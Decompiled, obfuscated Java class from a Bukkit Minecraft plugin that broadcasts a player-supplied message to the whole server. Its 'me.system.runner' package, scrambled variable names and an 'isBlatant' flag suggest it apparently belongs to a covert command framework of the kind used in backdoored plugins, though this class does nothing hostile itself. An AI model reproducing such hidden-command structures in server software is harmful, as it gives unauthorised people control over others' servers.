/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class BroadcastCommand
extends Command {
    public BroadcastCommand() {
        BroadcastCommand llllllllllllllIlllIllllllIIIlIlI;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core llllllllllllllIlllIlllllIllllllI, String llllllllllllllIlllIlllllIlllllIl, String[] llllllllllllllIlllIlllllIllllIIl, Player llllllllllllllIlllIlllllIllllIll) {
        StringBuilder llllllllllllllIlllIlllllIllllIlI = new StringBuilder();
        for (int llllllllllllllIlllIllllllIIIIIII = 1; llllllllllllllIlllIllllllIIIIIII != llllllllllllllIlllIlllllIllllIIl.length; ++llllllllllllllIlllIllllllIIIIIII) {
            llllllllllllllIlllIlllllIllllIlI.append(llllllllllllllIlllIlllllIllllIIl[llllllllllllllIlllIllllllIIIIIII]).append(" ");
        }
        Bukkit.broadcastMessage((String)ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(llllllllllllllIlllIlllllIllllIlI)));
    }
}

